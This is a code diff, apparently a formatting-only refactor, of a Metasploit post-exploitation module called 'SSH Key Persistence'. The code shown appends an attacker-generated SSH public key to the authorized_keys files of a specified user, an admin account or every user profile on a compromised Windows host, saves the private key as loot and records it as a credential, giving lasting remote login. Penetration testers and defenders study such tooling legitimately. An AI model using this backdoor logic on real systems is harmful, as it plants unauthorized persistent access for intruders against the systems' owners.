@@ -15,18 +15,18 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name'           => 'SSH Key Persistence',
-        'Description'    => %q{
+        'Name' => 'SSH Key Persistence',
+        'Description' => %q{
           This module will add an SSH key to a specified user (or all), to allow
           remote login via SSH at any time.
         },
-        'License'        => MSF_LICENSE,
-        'Author'         =>
+        'License' => MSF_LICENSE,
+        'Author' =>
           [
             'Dean Welch <dean_welch[at]rapid7.com>'
           ],
-        'Platform'       => [ 'windows' ],
-        'SessionTypes'   => [ 'meterpreter', 'shell' ]
+        'Platform' => [ 'windows' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ]
       )
     )
 
@@ -63,12 +63,12 @@ class MetasploitModule < Msf::Post
 
     paths = []
     if datastore['USERNAME']
-      grab_user_profiles.each { |profile|
-        paths << "#{profile["ProfileDir"]}#{sep}#{auth_key_folder}" if profile['UserName'] == datastore['USERNAME']
-      }
+      grab_user_profiles.each do |profile|
+        paths << "#{profile['ProfileDir']}#{sep}#{auth_key_folder}" if profile['UserName'] == datastore['USERNAME']
+      end
     end
 
-    if datastore['ADMIN']    # SSH keys for admin accounts are stored in a separate location
+    if datastore['ADMIN'] # SSH keys for admin accounts are stored in a separate location
       admin_auth_key_folder = datastore['ADMIN_KEY_FILE'].split(sep)[0...-1].join(sep)
       admin_auth_key_file = datastore['ADMIN_KEY_FILE'].split(sep)[-1]
 
@@ -77,10 +77,10 @@ class MetasploitModule < Msf::Post
       write_key([admin_auth_key_folder], admin_auth_key_file, sep)
     end
 
-    if !datastore['USERNAME'] and !datastore['ADMIN']
-      grab_user_profiles.each { |profile|
+    if !datastore['USERNAME'] && !datastore['ADMIN']
+      grab_user_profiles.each do |profile|
         paths << "#{profile['ProfileDir']}#{sep}#{auth_key_folder}"
-      }
+      end
     end
 
     if datastore['CREATESSHFOLDER'] == true
@@ -110,7 +110,7 @@ class MetasploitModule < Msf::Post
   end
 
   def auth_key_file_name(sshd_config)
-    /^AuthorizedKeysFile[\s]+(?<auth_key_file>[\w%\/\.]+)/ =~ sshd_config
+    %r{^AuthorizedKeysFile[\s]+(?<auth_key_file>[\w%/\.]+)} =~ sshd_config
     if auth_key_file
       auth_key_file = auth_key_file.gsub('%h', '')
       auth_key_file = auth_key_file.gsub('%%', '%')
@@ -145,7 +145,7 @@ class MetasploitModule < Msf::Post
   end
 
   def separator
-    if session.type == "meterpreter"
+    if session.type == 'meterpreter'
       sep = session.fs.file.separator
     else
       # Guess, but it's probably right
@@ -158,7 +158,7 @@ class MetasploitModule < Msf::Post
     if datastore['PUBKEY'].nil?
       key = SSHKey.generate
       our_pub_key = key.ssh_public_key
-      loot_path = store_loot("id_rsa", "text/plain", session, key.private_key, "ssh_id_rsa", "OpenSSH Private Key File")
+      loot_path = store_loot('id_rsa', 'text/plain', session, key.private_key, 'ssh_id_rsa', 'OpenSSH Private Key File')
       print_good("Storing new private key as #{loot_path}")
     else
       our_pub_key = ::File.read(datastore['PUBKEY'])
@@ -168,24 +168,24 @@ class MetasploitModule < Msf::Post
       authorized_keys = "#{path}#{sep}#{auth_key_file}"
       print_status("Adding key to #{authorized_keys}")
       append_file(authorized_keys, "\n#{our_pub_key}")
-      print_good("Key Added")
+      print_good('Key Added')
       set_pub_key_file_permissions(authorized_keys)
-      if datastore['PUBKEY'].nil?
-        path_array = path.split(sep)
-        path_array.pop
-        user = path_array.pop
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: refname,
-          private_type: :ssh_key,
-          private_data: key.private_key.to_s,
-          username: user,
-          workspace_id: myworkspace_id
-        }
+      next unless datastore['PUBKEY'].nil?
 
-        create_credential(credential_data)
-      end
+      path_array = path.split(sep)
+      path_array.pop
+      user = path_array.pop
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: refname,
+        private_type: :ssh_key,
+        private_data: key.private_key.to_s,
+        username: user,
+        workspace_id: myworkspace_id
+      }
+
+      create_credential(credential_data)
     end
   end
 end
